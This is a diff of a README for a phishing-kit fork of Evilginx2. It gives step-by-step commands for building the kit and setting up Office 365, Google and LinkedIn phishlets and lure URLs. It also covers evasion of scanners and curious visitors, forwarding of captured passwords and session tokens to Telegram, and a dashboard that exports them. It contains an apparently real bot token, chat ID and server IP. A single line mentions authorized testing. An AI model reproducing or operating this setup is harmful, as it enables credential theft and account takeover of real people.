+> **What this does:** Downloads the entire project into a folder called `evilginx2` and navigates into it.
+
+<br>
+
+## Step 4.2: Clean Up (Optional, for Fresh Builds)
 
 ```bash
-# Remove old vendor directory for a clean build
 rm -rf vendor/ 2>/dev/null
+```
 
-# Download and organize all Go dependencies
+> **What this does:** Removes any old dependency files (vendor directory). If the directory doesn't exist, the error is hidden (`2>/dev/null`).
+
+<br>
+
+## Step 4.3: Download Dependencies
+
+```bash
 go mod tidy
+```
 
-# Compile the Evilginx2 binary
+> **What this does:** Downloads all the Go packages that Evilginx2 needs to run. This might take 30-60 seconds.
+
+<br>
+
+## Step 4.4: Compile the Binary
+
+```bash
 go build -o evilginx2 .
+```
 
-# Verify the binary
+> **What this does:** Compiles the Go source code into a single executable file called `evilginx2`. This is the actual program.
+
+<br>
+
+## Step 4.5: Make It Executable
+
+```bash
+chmod +x evilginx2
+```
+
+> **What this does:** Adds "execute" permission — allows the file to be run as a program.
+
+<br>
+
+## Step 4.6: Verify the Binary
+
+```bash
 ls -lh evilginx2
 ```
 
-Expected output: `-rwxr-xr-x 1 root root 25M ... evilginx2`
+**Expected output:**
+```
+-rwxr-xr-x 1 root root 25M ... evilginx2
+```
 
-> **If `go mod tidy` fails:** Ensure Go 1.22.5 is installed (`go version`). Some modules require Go 1.22+.
+> The `25M` means the binary is 25 megabytes. If you see a much smaller number (like a few KB), something went wrong.
+
+<br>
 
 ---
 
+<br>
+
+<!--
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                            ║
+║     ██████  ██   ██ ██    ██ ██ ███    ██  ██████                          ║
+║    ██      ██   ██ ██    ██ ██ ████   ██ ██                               ║
+║    ██      ███████ ██    ██ ██ ██ ██  ██ ██   ███                          ║
+║    ██      ██   ██ ██    ██ ██ ██  ██ ██ ██    ██                          ║
+║     ██████ ██   ██  ██████  ██ ██   ████  ██████                           ║
+║                                                                            ║
+║              PHASE 5: EVILGINX2 CONSOLE CONFIGURATION                      ║
+║                                                                            ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+-->
+
 # ⚙️ PHASE 5: Evilginx2 Console Configuration
 
-## Step 5.1: Start Evilginx2
+**Goal:** Configure Evilginx2 with your domain, IP, SSL settings, and more.
+
+<br>
+
+## Step 5.1: Start Evilginx2 with Dashboard
 
 ```bash
 cd /root/evilginx2
 ./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
 ```
 
-| Flag | Purpose |
-|---|---|
-| `-dashboard 0.0.0.0:5000` | Dashboard accessible on all interfaces at port 5000 |
-| `-dashboard-user admin` | Dashboard login username |
-| `-dashboard-pass mypass1234` | Dashboard login password |
+### What These Flags Mean
 
-> **Change `mypass1234` to a strong password!**
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                      COMMAND LINE FLAGS EXPLAINED                           │
+├───────────────────────────┬─────────────────────────────────────────────────┤
+│           FLAG            │                    PURPOSE                       │
+├───────────────────────────┼─────────────────────────────────────────────────┤
+│  -dashboard 0.0.0.0:5000 │ Dashboard accessible on ALL network interfaces  │
+│                           │ at port 5000.                                    │
+├───────────────────────────┼─────────────────────────────────────────────────┤
+│  -dashboard-user admin   │ Username to log into the dashboard               │
+├───────────────────────────┼─────────────────────────────────────────────────┤
+│  -dashboard-pass mypass  │ Password to log into the dashboard               │
+│          1234             │ CHANGE THIS TO SOMETHING STRONG                 │
+└───────────────────────────┴─────────────────────────────────────────────────┘
+```
 
-## Step 5.2: Configure Domain & IP
+> **⚠️ IMPORTANT:** Change `mypass1234` to a strong, unique password!
 
-Inside the Evilginx console (`:` prompt):
+You'll see the Evilginx console with a `:` prompt:
+
+```
+evilginx>
+```
+
+<br>
+
+## Step 5.2: Set Your Domain
 
 ```
 : config domain entreexampdremd.online
+```
+
+> **Replace `entreexampdremd.online` with YOUR actual domain.**
+
+This tells Evilginx2 which domain to use for certificates and phishing pages.
+
+<br>
+
+## Step 5.3: Set Your Server's External IP
+
+```
 : config ipv4 external 173.44.141.147
 ```
 
-## Step 5.3: Enable Autocert (SSL Certificates)
+> **Replace `173.44.141.147` with YOUR server's actual public IP address.**
+
+This tells Evilginx2 which IP address to use in URLs and redirects.
+
+<br>
+
+## Step 5.4: Enable Automatic SSL Certificates
 
 ```
 : config autocert on
 ```
 
-This tells Evilginx2 to automatically request and renew Let's Encrypt certificates for your domain and all subdomains.
+This tells Evilginx2 to automatically get and renew **Let's Encrypt SSL certificates** for your domain. Without this, your phishing pages will show "Not Secure" warnings.
 
-## Step 5.4: Set Unauthorized Redirect URL
+<br>
 
-When someone visits your phishing domain without a valid lure path, they get redirected here:
+## Step 5.5: Set an "Unauthorized" Redirect URL
+
+When someone visits your phishing domain **without** a valid lure link, they get sent here:
 
 ```
 : config unauth_url https://www.google.com
 ```
 
-## Step 5.5: Configure Blacklist Mode
+> **Why this matters:** If a curious person types `https://login.yourdomain.com` directly (without the secret lure path), they get redirected to Google. This makes your setup look less suspicious.
+
+<br>
+
+## Step 5.6: Configure Blacklist Mode
 
 ```
 : blacklist unauth
 ```
 
-| Mode | Behavior |
-|---|---|
-| `off` | No blacklisting |
-| `unauth` | Blacklist IPs that hit unauthorized URLs (no valid lure token) |
-| `all` | Blacklist every new visitor immediately |
-| `noadd` | Check blacklist but don't add new IPs |
+### Blacklist Mode Options
 
-## Step 5.6: Verify Configuration
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                         BLACKLIST MODES EXPLAINED                           │
+├──────────────┬──────────────────────────────────────────────────────────────┤
+│     MODE     │                     BEHAVIOR                                 │
+├──────────────┼──────────────────────────────────────────────────────────────┤
+│  off         │ No blacklisting — everyone gets through                       │
+│  unauth      │ Blacklist IPs that visit without a valid lure token          │
+│              │ (Recommended — blocks scanners and curious visitors)         │
+│  all         │ Blacklist EVERY new visitor immediately                      │
+│              │ (Very restrictive — might block your targets)                │
+│  noadd       │ Check the blacklist, but don't add new IPs                   │
+└──────────────┴──────────────────────────────────────────────────────────────┘
+```
+
+<br>
+
+## Step 5.7: Verify All Settings
 
 ```
 : config
 ```
 
-Expected output:
+**Expected output (example):**
 
 ```
 domain             : entreexampdremd.online
@@ -413,66 +856,137 @@ chatid             :
 teletoken          :
 ```
 
+> Notice **chatid** and **teletoken** are empty — we'll fill those in Phase 6!
+
+<br>
+
 ---
+
+<br>
+
+<!--
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                            ║
+║    ████████ ███████  ██      ███████  ██████  ██████   █████  ███    ██   ║
+║       ██    ██      ██      ██      ██      ██   ██ ██   ██ ████   ██   ║
+║       ██    █████   ██      █████   ██      ██████  ███████ ██ ██  ██   ║
+║       ██    ██      ██      ██      ██      ██   ██ ██   ██ ██  ██ ██   ║
+║       ██    ███████ ███████ ███████  ██████ ██   ██ ██   ██ ██   ████   ║
+║                                                                            ║
+║                    PHASE 6: TELEGRAM INTEGRATION                          ║
+║                                                                            ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+-->
 
 # 📱 PHASE 6: Telegram Integration
 
-This is the flagship feature of this fork — real-time capture notifications delivered to your Telegram.
+**Goal:** Connect Evilginx2 to Telegram so you get instant notifications when credentials are captured.
+
+> **This is the flagship feature of this fork.** When someone submits credentials, you'll get a message on your phone within seconds.
+
+<br>
 
 ## Step 6.1: Create a Telegram Bot
 
-1. Open Telegram and search for **@BotFather**
-2. Send: `/newbot`
-3. Choose a display name (e.g., `My Evilginx Notifier`)
-4. Choose a username ending in `_bot` (e.g., `myevilginx_bot`)
-5. **Copy the bot token** — it looks like: `8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo`
+Telegram bots are automated accounts that can send you messages. We need one to deliver the captured credentials.
 
-## Step 6.2: Verify the Bot Token
+1. Open Telegram on your phone or desktop
+2. Search for **@BotFather** (it's Telegram's official bot creator)
+3. Start a chat and send: `/newbot`
+4. BotFather will ask for a **display name** — choose something like `My Security Notifier`
+5. Then it asks for a **username** — must end in `_bot`, for example `my_evilginx_bot`
+6. **BotFather will give you a token.** It looks like this:
 
-Test your bot token immediately with this curl command:
+```
+8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
+```
+
+> **⚠️ COPY THIS TOKEN AND KEEP IT SAFE.** Anyone with this token can control your bot.
+
+<br>
+
+## Step 6.2: Test Your Bot Token Immediately
+
+Before we go further, let's verify the token works:
 
 ```bash
 curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getMe"
 ```
 
-Expected response:
+**Expected response (formatted):**
 ```json
-{"ok":true,"result":{"id":8863425004,"is_bot":true,"first_name":"myevulbot","username":"evuuulbot","can_join_groups":true,...}}
+{
+  "ok": true,
+  "result": {
+    "id": 8863425004,
+    "is_bot": true,
+    "first_name": "My Security Notifier",
+    "username": "my_evilginx_bot"
+  }
+}
 ```
+
+> **If you get `"ok": false`:** Your token is wrong. Go back to BotFather and get the correct token.
+
+<br>
 
 ## Step 6.3: Get Your Chat ID
 
-1. Search for your bot on Telegram: `@YourBotName_bot`
-2. Send any message to it (e.g., "Hello")
-3. Run this command (uses the same token):
+Your "Chat ID" is like your Telegram address. It tells the bot where to send messages.
+
+**First:** Search for your bot on Telegram: `@my_evilginx_bot` and send it any message (like "Hello").
+
+**Then run this command:**
 
 ```bash
 curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getUpdates"
 ```
 
-Expected response snippet:
+**Expected response (snippet):**
 ```json
-{"ok":true,"result":[{"message":{"chat":{"id":7545456339,"first_name":"Draconian",...}}}]}
+{
+  "ok": true,
+  "result": [
+    {
+      "message": {
+        "chat": {
+          "id": 7545456339,
+          "first_name": "Draconian"
+        }
+      }
+    }
+  ]
+}
 ```
 
-> **`7545456339`** is your Chat ID. If `getUpdates` returns an empty `result:[]`, you haven't messaged the bot yet — send it a message first.
+> **`7545456339` is YOUR Chat ID.** Write it down. If `result` is empty `[]`, you haven't messaged your bot yet — send it a message first!
 
-## Step 6.4: Test Sending a Message via API
+<br>
+
+## Step 6.4: Test Sending a Message
+
+Let's verify everything works by sending a test message:
 
 ```bash
-curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/sendMessage?chat_id=7545456339&text=test"
+curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/sendMessage?chat_id=7545456339&text=Hello%20from%20Evilginx"
 ```
 
-You should receive the message "test" in Telegram immediately.
+You should receive **"Hello from Evilginx"** in your Telegram chat within seconds.
+
+<br>
 
 ## Step 6.5: Configure Telegram in Evilginx Console
 
-Back in the Evilginx console (`:` prompt):
+Now enter these commands in Evilginx console (where you see the `evilginx>` prompt):
 
 ```
 : config teletoken 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
 : config chatid 7545456339
 ```
+
+> **Replace the token and chat ID with YOUR values.**
+
+<br>
 
 ## Step 6.6: Test Telegram from Inside Evilginx
 
@@ -480,61 +994,133 @@ Back in the Evilginx console (`:` prompt):
 : test telegram
 ```
 
-If successful, you'll see: `Telegram test message sent successfully!` and receive a formatted test message in Telegram.
+**If successful, you'll see:**
+```
+Telegram test message sent successfully!
+```
+
+And you'll receive a formatted test message in Telegram.
+
+> **If it fails:** Double-check your token and chat ID. Make sure the bot can message you.
+
+<br>
 
 ---
 
+<br>
+
+<!--
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                            ║
+║    ██████   ██   ██  ██  ███████  ██   ██  ██      ███████ ████████      ║
+║    ██   ██  ██   ██  ██  ██       ██   ██  ██      ██         ██         ║
+║    ██████   ███████  ██  ███████  ███████  ██      █████      ██         ║
+║    ██       ██   ██  ██       ██  ██   ██  ██      ██         ██         ║
+║    ██       ██   ██  ██  ███████  ██   ██  ███████ ███████    ██         ║
+║                                                                            ║
+║                    PHASE 7: PHISHLETS & LURES                             ║
+║                                                                            ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+-->
+
 # 🎣 PHASE 7: Phishlets & Lures
 
-## Step 7.1: List Available Phishlets
+**Goal:** Set up the phishing page and create a URL to send to your targets.
+
+<br>
+
+## Step 7.1: What Are Phishlets?
+
+A **phishlet** is a YAML configuration file that tells Evilginx2 how to proxy a specific website (like Office 365, Google, or LinkedIn). Each phishlet defines:
+
+- Which subdomain to use (e.g., `login.yourdomain.com`)
+- Which URLs to proxy
+- Where to find the login form
+- Which cookies and tokens to capture
+
+Think of a phishlet as a **template** for cloning a specific website.
+
+<br>
+
+## Step 7.2: List Available Phishlets
 
 ```
 : phishlets
 ```
 
-This shows all phishlets in the `/root/evilginx2/phishlets/` directory with their status (enabled/disabled).
+This shows all phishlets found in the `/root/evilginx2/phishlets/` directory.
 
-## Step 7.2: Set Hostname for a Phishlet
+You'll see something like:
+```
++--------------------+----------+------------------+
+|     Phishlet       |  Status  |   Hostname       |
++--------------------+----------+------------------+
+| office365          | disabled |                  |
+| google             | disabled |                  |
+| linkedin           | disabled |                  |
+| facebook           | disabled |                  |
+| instagram          | disabled |                  |
++--------------------+----------+------------------+
+```
+
+<br>
+
+## Step 7.3: Set Hostname for a Phishlet
+
+A hostname tells the phishlet which subdomain to use:
 
 ```
 : phishlets hostname office365 entreexampdremd.online
 ```
 
-This configures the phishlet to use `login.entreexampdremd.online` as the phishing domain (the phishlet YAML defines the `login` subdomain).
+> **What this does:** The Office 365 phishlet will use `login.entreexampdremd.online` (the phishlet's YAML file defines which subdomain prefix, like `login`, to use).
 
-## Step 7.3: Enable the Phishlet
+<br>
+
+## Step 7.4: Enable the Phishlet
 
 ```
 : phishlets enable office365
 ```
 
-## Step 7.4: Create a Lure (Phishing URL)
+**Expected output:**
+```
+phishlet 'office365' enabled on hostname 'login.entreexampdremd.online'
+```
+
+> **Now** anyone who visits `https://login.entreexampdremd.online` will see the Office 365 login page.
+
+<br>
+
+## Step 7.5: Create a Lure
+
+A **lure** is a specific phishing URL. Each lure has a unique secret path so you can track different campaigns.
 
 ```
 : lures create office365
 ```
 
-Output:
+**Expected output:**
 ```
 lure_id: 0
 tokens: ...
 ```
 
-## Step 7.5: Modify the Lure (Optional)
+> **`lure_id: 0`** is the ID of your first lure. The **tokens** is a secret key embedded in the URL.
 
-Set a specific redirect URL for this lure (overrides the global `unauth_url`):
+<br>
+
+## Step 7.6: Modify the Lure (Optional)
+
+You can set a specific redirect URL for this lure (overrides the global `unauth_url`):
 
 ```
 : lures edit 0 redirect-url https://www.microsoft.com
 ```
 
-## Step 7.6: Set a User-Agent Filter (Optional)
+After the victim logs in, they'll be redirected to Microsoft's real website (looks more realistic).
 
-Only allow specific user agents to access this lure:
-
-```
-: lures edit 0 ua_filter "Mozilla|Chrome|Safari"
-```
+<br>
 
 ## Step 7.7: Get Your Phishing URL
 
@@ -542,13 +1128,62 @@ Only allow specific user agents to access this lure:
 : lures get-url 0
 ```
 
-Copy the URL shown — it will look like: `https://login.entreexampdremd.online/xxxxxx`
+**Expected output:**
+```
+https://login.entreexampdremd.online/xxxxxx
+```
+
+> **This is YOUR phishing URL.** Copy it. Send it to your target (during an authorized test).
+
+The `xxxxxx` part is the secret path — only people with this exact URL will see the phishing page. Everyone else gets redirected to Google.
+
+<br>
+
+## Step 7.8: Create Multiple Phishlets (Optional)
+
+You can run multiple phishlets at the same time:
+
+```
+: phishlets hostname google entreexampdremd.online
+: phishlets enable google
+: lures create google
+: lures get-url 0
+
+: phishlets hostname linkedin entreexampdremd.online
+: phishlets enable linkedin
+: lures create linkedin
+: lures get-url 0
+```
+
+Each phishlet uses a different subdomain defined in its YAML file.
+
+<br>
 
 ---
 
+<br>
+
+<!--
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                            ║
+║     ███████  ██    ██ ███████ ████████ ███████ ███    ███                 ║
+║    ██       ██    ██ ██         ██    ██      ████  ████                  ║
+║    ███████  ██    ██ ███████    ██    █████   ██ ████ ██                  ║
+║         ██  ██    ██      ██    ██    ██      ██  ██  ██                  ║
+║    ███████   ██████  ███████    ██    ███████ ██      ██                  ║
+║                                                                            ║
+║               PHASE 8: SYSTEMD SERVICE (AUTO-START)                       ║
+║                                                                            ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+-->
+
 # 🔄 PHASE 8: Systemd Service (Auto-Start on Boot)
 
-This ensures Evilginx2 starts automatically when your server reboots and restarts if it crashes.
+**Goal:** Set up Evilginx2 to start automatically when your server reboots and restart if it crashes.
+
+> **Without this step:** If your server restarts (for updates, power outage, etc.), Evilginx2 stays off and you'll lose captures until you manually start it again.
+
+<br>
 
 ## Step 8.1: Create the Service File
 
@@ -556,7 +1191,13 @@ This ensures Evilginx2 starts automatically when your server reboots and restart
 sudo nano /etc/systemd/system/evilginx.service
 ```
 
+> **What this does:** Opens a text editor (nano) to create a new service file.
+
+<br>
+
 ## Step 8.2: Paste the Service Configuration
+
+Copy and paste this EXACTLY (right-click to paste in the terminal):
 
 ```ini
 [Unit]
@@ -576,645 +1217,200 @@ LimitNOFILE=65535
 WantedBy=multi-user.target
 ```
 
-## Step 8.3: Enable and Start
+> **⚠️ IMPORTANT:** Change `mypass1234` to the actual password you chose.
+
+### What Each Section Does
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    SYSTEMD SERVICE CONFIG EXPLAINED                         │
+├──────────────────────────┬──────────────────────────────────────────────────┤
+│        SETTING           │                     MEANING                      │
+├──────────────────────────┼──────────────────────────────────────────────────┤
+│  After=network.target    │ Start AFTER the network is ready                 │
+│  Type=simple             │ It's a simple program (not a fork)               │
+│  User=root               │ Run as root user (needed for port 53, 80, 443)  │
+│  WorkingDirectory=...    │ Which folder to run from                         │
+│  ExecStart=...           │ The actual command to run                        │
+│  Restart=always          │ Restart if it crashes                            │
+│  RestartSec=5            │ Wait 5 seconds before restarting                 │
+│  LimitNOFILE=65535       │ Allow many open files (important for connections)│
+│  WantedBy=multi-user.    │ Start on normal system boot                      │
+│           target          │                                                  │
+└──────────────────────────┴──────────────────────────────────────────────────┘
+```
+
+**To save in nano:** Press `Ctrl+X`, then `Y`, then `Enter`.
+
+<br>
+
+## Step 8.3: Enable and Start the Service
 
 ```bash
+# Reload systemd so it knows about our new service
 sudo systemctl daemon-reload
+
+# Enable (auto-start on boot) AND start immediately
 sudo systemctl enable --now evilginx
+
+# Check if it's running
 sudo systemctl status evilginx
 ```
 
-Expected: `active (running)` in green.
+**Expected output** (look for the green "active (running)"):
+```
+● evilginx.service - Monsterz Evilginx2 with Autocert & Dashboard
+     Loaded: loaded (/etc/systemd/system/evilginx.service; enabled;)
+     Active: active (running) since ...
+```
+
+<br>
 
 ## Step 8.4: View Logs
+
+To see what Evilginx2 is doing in real-time:
 
 ```bash
 sudo journalctl -u evilginx -f
 ```
 
-Press `Ctrl+C` to exit the log viewer.
+> Press `Ctrl+C` to exit the log viewer. The `-f` flag means "follow" — it shows new log entries as they appear.
 
-## Step 8.5: Stop/Start/Restart Commands
+<br>
+
+## Step 8.5: Service Management Commands
 
 ```bash
+# Stop Evilginx2
 sudo systemctl stop evilginx
+
+# Start Evilginx2
 sudo systemctl start evilginx
+
+# Restart Evilginx2
 sudo systemctl restart evilginx
+
+# Check status
+sudo systemctl status evilginx
+
+# Disable auto-start (reverses the setup)
+sudo systemctl disable evilginx
 ```
+
+<br>
 
 ---
 
+<br>
+
+<!--
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                                                                            ║
+║    ██    ██ ███████ ██████       ██████   █████  ███████  ██   ██         ║
+║    ██    ██ ██      ██   ██     ██   ██ ██   ██ ██       ██   ██         ║
+║    ██    ██ █████   ██████      ██████  ███████ ███████  ███████         ║
+║     ██  ██  ██      ██   ██     ██   ██ ██   ██      ██  ██   ██         ║
+║      ████   ███████ ██████      ██████  ██   ██ ███████  ██   ██         ║
+║                                                                            ║
+║                    PHASE 9: WEB DASHBOARD                                 ║
+║                                                                            ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+-->
+
 # 📊 PHASE 9: Web Dashboard
 
-The web dashboard lets you view, search, filter, export, and delete captured sessions from your browser.
+**Goal:** Access your captured sessions from any browser.
+
+<br>
 
 ## Step 9.1: Access the Dashboard
 
-Open your browser and visit:
+Open your favorite browser and visit:
 
 ```
 http://173.44.141.147:5000
 ```
 
-Or if you set up an `admin` DNS record:
+Or if you set up the `admin` DNS record:
 
 ```
 http://admin.entreexampdremd.online:5000
 ```
 
+<br>
+
 ## Step 9.2: Login
 
-Use the credentials you set: `admin` / `mypass1234`
+Enter the credentials you set when starting Evilginx2:
+
+- **Username:** `admin`
+- **Password:** `mypass1234`
+
+<br>
 
 ## Step 9.3: Dashboard Features
 
-| Feature | How to Access |
-|---|---|
-| **Session List** | Main page — all captured sessions with timestamps |
-| **Search** | Type in the search box to filter by username, password, phishlet, or IP |
-| **Filter by Phishlet** | Use the phishlet dropdown |
-| **View Details** | Click a session row to see tokens, cookies, and full data |
-| **Export CSV** | Click "Export CSV" button — downloads all sessions as CSV |
-| **Export JSON** | Click "Export JSON" button — downloads all sessions as JSON |
-| **Delete Session** | Click the delete button on a session row |
-| **Refresh** | Auto-refreshes every 5 seconds (toggleable) |
-| **Dark Mode** | Toggle button in the top-right |
-| **Stats** | Total sessions, unique phishlets, displayed count |
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    DASHBOARD FEATURES — WHAT YOU CAN DO                     │
+├──────────────────────────────────┬──────────────────────────────────────────┤
+│           FEATURE                │              HOW TO USE IT               │
+├──────────────────────────────────┼──────────────────────────────────────────┤
+│  View all sessions               │ Main page — see every capture            │
+│  Search by any field             │ Type in the search box (username, IP,    │
+│                                  │ password, phishlet name)                 │
+│  Filter by phishlet              │ Use the dropdown to show only one type   │
+│  View session details            │ Click any row to see cookies and tokens  │
+│  Export as CSV                   │ Download a spreadsheet-ready file        │
+│  Export as JSON                  │ Download a machine-readable file         │
+│  Delete a session                │ Click the delete button on any row       │
+│  Auto-refresh                    │ Updates automatically every 5 seconds    │
+│  Dark mode                       │ Toggle for comfortable nighttime viewing │
+│  Pagination                      │ Navigate through many sessions           │
+└──────────────────────────────────┴──────────────────────────────────────────┘
+```
 
-## Step 9.4: API Endpoints
+<br>
 
-The dashboard also exposes a REST API:
+## Step 9.4: API Endpoints (For Advanced Users)
 
-| Endpoint | Method | Purpose |
-|---|---|---|
-| `/api/sessions` | GET | List all sessions (supports `?search=`, `?phishlet=`, `?limit=`, `?offset=`) |
-| `/api/sessions/export` | GET | Export sessions (`?format=csv` or `?format=json`) |
-| `/api/sessions/{id}` | GET | Get a single session by ID |
-| `/api/sessions/{id}` | DELETE | Delete a single session by ID |
+The dashboard also has a REST API for programmatic access:
+
+```
+┌─────────────────────────────────────┬────────┬─────────────────────────────────┐
+│              ENDPOINT               │ METHOD │            PURPOSE              │
+├─────────────────────────────────────┼────────┼─────────────────────────────────┤
+│  /api/sessions                      │  GET   │ List all sessions               │
+│  /api/sessions?search=admin         │  GET   │ Search for "admin"              │
+│  /api/sessions?phishlet=office365   │  GET   │ Filter by phishlet              │
+│  /api/sessions?limit=10&offset=0    │  GET   │ Pagination                      │
+│  /api/sessions/export?format=csv    │  GET   │ Download as CSV                 │
+│  /api/sessions/export?format=json   │  GET   │ Download as JSON                │
+│  /api/sessions/{id}                 │  GET   │ Get one session                 │
+│  /api/sessions/{id}                 │ DELETE │ Delete one session              │
+└─────────────────────────────────────┴────────┴─────────────────────────────────┘
+```
+
+### API Examples
+
+```bash
+# List all sessions
+curl -u admin:mypass1234 "http://173.44.141.147:5000/api/sessions"
+
+# Search sessions
+curl -u admin:mypass1234 "http://173.44.141.147:5000/api/sessions?search=admin"
+
+# Export CSV
+curl -u admin:mypass1234 "http://173.44.141.147:5000/api/sessions/export?format=csv" -o sessions.csv
+
+# Delete session #1
+curl -u admin:mypass1234 -X DELETE "http://173.44.141.147:5000/api/sessions/1"
+```
+
+<br>
 
 ---
 
-# 🐳 PHASE 10: Docker Deployment
+<br>
 
-For containerized deployment, this fork includes a multi-stage Docker build.
-
-## Step 10.1: Build the Docker Image
-
-```bash
-cd /root/evilginx2
-docker build -t evilginx2-telegram .
-```
-
-## Step 10.2: Run the Container
-
-```bash
-docker run -d \
-  --name evilginx2 \
-  --restart unless-stopped \
-  -p 53:53/udp \
-  -p 80:80 \
-  -p 443:443 \
-  -p 5000:5000 \
-  -v evilginx-data:/home/evilginx/.evilginx \
-  evilginx2-telegram \
-  -dashboard 0.0.0.0:5000 \
-  -dashboard-user admin \
-  -dashboard-pass mypass1234
-```
-
-## Step 10.3: Access the Container Shell
-
-```bash
-docker exec -it evilginx2 sh
-```
-
-## Step 10.4: Docker Compose (Alternative)
-
-Create a `docker-compose.yml`:
-
-```yaml
-version: '3.8'
-services:
-  evilginx2:
-    build: .
-    container_name: evilginx2
-    restart: unless-stopped
-    ports:
-      - "53:53/udp"
-      - "80:80"
-      - "443:443"
-      - "5000:5000"
-    volumes:
-      - evilginx-data:/home/evilginx/.evilginx
-    command: >
-      -dashboard 0.0.0.0:5000
-      -dashboard-user admin
-      -dashboard-pass mypass1234
-
-volumes:
-  evilginx-data:
-```
-
-Then run:
-
-```bash
-docker-compose up -d
-```
-
----
-
-# ✅ PHASE 11: Testing Your Setup
-
-## Test 1: Dashboard
-
-```
-http://173.44.141.147:5000
-```
-
-Login with `admin` / `mypass1234`. You should see the dashboard with 0 sessions.
-
-## Test 2: Phishing Capture
-
-1. Copy your lure URL from `lures get-url 0`
-2. Open an **Incognito/Private browser window**
-3. Paste the URL and press Enter
-4. You should see the Office 365 login page
-5. Enter any fake credentials (e.g., `test@example.com` / `Password123!`)
-6. Click **Sign in**
-
-## Test 3: Check Telegram
-
-Within seconds, you should receive a Telegram message with:
-
-```
-✨ Session Information ✨
-
-👤 Username: test@example.com
-🔑 Password: Password123!
-🌐 Landing URL: [Link]
-🖥️ User Agent: Mozilla/5.0...
-🌍 Remote Address: 1.2.3.4
-🕒 Created: 1780014345
-
-📦 Tokens are attached as a separate file.
-```
-
-## Test 4: Check Dashboard
-
-Refresh the dashboard — the session should appear with username, password, and tokens.
-
-## Test 5: Verify Auto-Renewal
-
-Stop and restart Evilginx2:
-
-```bash
-pkill -f evilginx2
-sleep 2
-./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
-```
-
-Verify configuration is persisted:
-
-```
-: config
-```
-
----
-
-# 🧠 PHASE 12: Pro Tips & Advanced Features
-
-## 12.1: Telegram Auto-Updating Messages
-
-When credentials are first captured, a Telegram message is sent. If additional tokens (e.g., body tokens, HTTP tokens) are captured later, the **same message is edited** rather than sending a new one. This is handled by `core/notify.go`:
-
-```
-Session captured ──► First Telegram message (with message_id stored)
-    │
-    ▼
-More tokens arrive ──► editMessageText + editMessageMediaGroup
-    │
-    ▼
-Same message updated ──► No duplicate notifications
-```
-
-## 12.2: Async Notification Queue
-
-Telegram notifications are processed asynchronously via a buffered channel (`core/telegram_queue.go`), so the HTTP proxy never blocks waiting for Telegram API responses.
-
-## 12.3: Multiple Phishlets
-
-```bash
-: phishlets hostname office365 entreexampdremd.online
-: phishlets enable office365
-: phishlets hostname google entreexampdremd.online
-: phishlets enable google
-: phishlets hostname linkedin entreexampdremd.online
-: phishlets enable linkedin
-: lures create office365
-: lures create google
-: lures create linkedin
-: lures get-url 0
-: lures get-url 1
-: lures get-url 2
-```
-
-Each phishlet uses a different subdomain defined in its YAML file.
-
-## 12.4: Redirector Pages
-
-Instead of redirecting to Google, you can show a custom HTML page:
-
-1. Place HTML files in `/root/evilginx2/redirectors/my_redirector/`
-2. Edit the lure:
-
-```
-: lures edit 0 redirector my_redirector
-```
-
-## 12.5: Gophish Integration
-
-For full campaign management with email templates and click tracking:
-
-```
-: config gophish_url https://your-gophish-server:3333
-: config gophish_api your-api-key
-```
-
-## 12.6: Using screen for Persistent Sessions
-
-```bash
-screen -S evilginx
-./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
-```
-
-Detach with `Ctrl+A` then `D`. Reattach with `screen -r evilginx`.
-
-## 12.7: Port Conflict Resolution
-
-If you see "address already in use" errors:
-
-```bash
-# Kill existing Evilginx
-pkill -f evilginx2
-
-# Wait for ports to free
-sleep 2
-
-# Verify ports are free
-ss -tlnp | grep -E '(:53|:443|:5000)'
-
-# Restart
-./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
-```
-
-## 12.8: Database Backup
-
-```bash
-cp /root/.evilginx/data.db /root/.evilginx/data.db.backup
-```
-
-## 12.9: Viewing Captured Tokens
-
-In the dashboard, click a session row to see the full token JSON. You can download tokens as a file compatible with browser cookie editors.
-
----
-
-# 📝 Full Command Cheat Sheet
-
-## System Commands
-```bash
-# Connect
-ssh root@YOUR_SERVER_IP
-
-# Update system
-sudo apt update && sudo apt upgrade -y
-
-# Firewall
-sudo ufw allow 22/tcp && sudo ufw allow 53/udp && sudo ufw allow 80/tcp && sudo ufw allow 443/tcp && sudo ufw allow 5000/tcp && sudo ufw --force enable
-
-# Fix DNS port conflict
-sudo systemctl stop systemd-resolved && sudo systemctl disable systemd-resolved
-sudo rm -f /etc/resolv.conf && echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
-sudo chattr +i /etc/resolv.conf
-
-# Kill Evilginx
-pkill -f evilginx2
-```
-
-## Build Commands
-```bash
-cd /root && git clone https://github.com/officialmonsterz/evilginx2.git
-cd evilginx2 && go mod tidy && go build -o evilginx2 . && chmod +x evilginx2
-```
-
-## Start Evilginx2
-```bash
-# With Dashboard
-./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass1234
-
